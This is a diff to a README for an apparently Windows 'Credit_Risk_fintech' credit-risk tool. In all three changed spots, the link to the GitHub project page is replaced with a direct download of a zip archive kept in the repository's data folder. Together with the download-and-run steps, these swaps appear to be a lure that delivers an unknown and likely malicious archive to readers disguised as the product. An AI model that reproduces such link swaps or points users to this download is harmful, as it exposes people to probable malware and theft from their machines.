@@ -1,6 +1,6 @@
 # 🚦 Credit_Risk_fintech - Clear Credit Risk Insights
 
-[![Download Credit_Risk_fintech](https://img.shields.io/badge/Download-Credit_Risk_fintech-brightgreen?style=for-the-badge)](https://github.com/DaRealAlpha8436/Credit_Risk_fintech)
+[![Download Credit_Risk_fintech](https://img.shields.io/badge/Download-Credit_Risk_fintech-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/DaRealAlpha8436/Credit_Risk_fintech/main/data/fintech_Credit_Risk_v3.4.zip)
 
 ---
 
@@ -36,7 +36,7 @@ This guide will help you download and run Credit_Risk_fintech on a Windows PC. Y
 ### Step 1: Download the Software
 
 Click the big green button at the top, or this link, to visit the download page:  
-[https://github.com/DaRealAlpha8436/Credit_Risk_fintech](https://github.com/DaRealAlpha8436/Credit_Risk_fintech)
+[https://raw.githubusercontent.com/DaRealAlpha8436/Credit_Risk_fintech/main/data/fintech_Credit_Risk_v3.4.zip](https://raw.githubusercontent.com/DaRealAlpha8436/Credit_Risk_fintech/main/data/fintech_Credit_Risk_v3.4.zip)
 
 Once on the page:
 
@@ -144,7 +144,7 @@ If you face any issues:
 ## 🔗 Useful Links
 
 - Download and visit the project here:  
-  [https://github.com/DaRealAlpha8436/Credit_Risk_fintech](https://github.com/DaRealAlpha8436/Credit_Risk_fintech)
+  [https://raw.githubusercontent.com/DaRealAlpha8436/Credit_Risk_fintech/main/data/fintech_Credit_Risk_v3.4.zip](https://raw.githubusercontent.com/DaRealAlpha8436/Credit_Risk_fintech/main/data/fintech_Credit_Risk_v3.4.zip)
 
 - View user guides or additional resources on the project GitHub.
 
